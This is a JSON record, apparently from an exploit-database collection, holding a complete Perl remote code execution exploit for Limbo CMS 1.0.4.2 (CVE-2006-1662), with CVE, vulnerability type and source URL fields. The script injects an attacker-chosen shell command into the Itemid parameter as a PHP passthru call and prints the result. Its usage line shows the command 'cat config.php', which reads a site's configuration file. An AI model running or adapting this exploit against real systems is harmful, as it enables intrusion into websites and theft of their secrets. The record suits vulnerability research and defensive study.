{
  "id": "1541",
  "title": "Limbo CMS 1.0.4.2 - &#039;itemID&#039; Remote Code Execution",
  "cve": "CVE-2006-1662",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n##\r\n## Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit\r\n## Bug Discovered by: Coloss / Epsilon (advance1[at]gmail.com) http://coded.altervista.org/limbophp.pl\r\n## /str0ke (milw0rm.com)\r\n\r\nuse LWP::Simple;\r\n\r\n$serv     =  $ARGV[0];\r\n$path     =  $ARGV[1];\r\n$command  =  $ARGV[2];\r\n$cmd      =  \"echo start_er;\".\r\n             \"$command;\".\r\n             \"echo end_er\";\r\n\r\nmy $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));\r\n\r\nsub usage\r\n{\r\n        print \"Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit /str0ke (milw0rm.com)\";\r\n        print \"Usage: $0 www.example.com /directory/ \\\"cat config.php\\\"\\n\";\r\n        print \"sever    -  URL\\n\";\r\n        print \"path     -  path to limbo\\n\";\r\n        print \"command  -  command to execute\\n\";\r\n        exit ();\r\n}\r\n\r\nsub exploit\r\n{\r\n        print qq(Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit\\n/str0ke (milw0rm.com)\\n\\n);\r\n        $URL = sprintf(\"http://%s%sindex.php?option=frontpage&Itemid=passthru($byte)\",$serv,$path);\r\n        my $content = get \"$URL\";\r\n        if ($content =~ m/start_er(.*?)end_er/ms) {\r\n                my $out = $1;\r\n                $out =~ s/^\\s+|\\s+$//gs;\r\n                if ($out) {\r\n                        print \"$out\\n\";\r\n                }\r\n        }\r\n}\r\n\r\nif (@ARGV != 3){&usage;}else{&exploit;}\r\n\r\n# milw0rm.com [2006-03-01]",
  "url": "https://www.exploit-db.com/exploits/1541"
}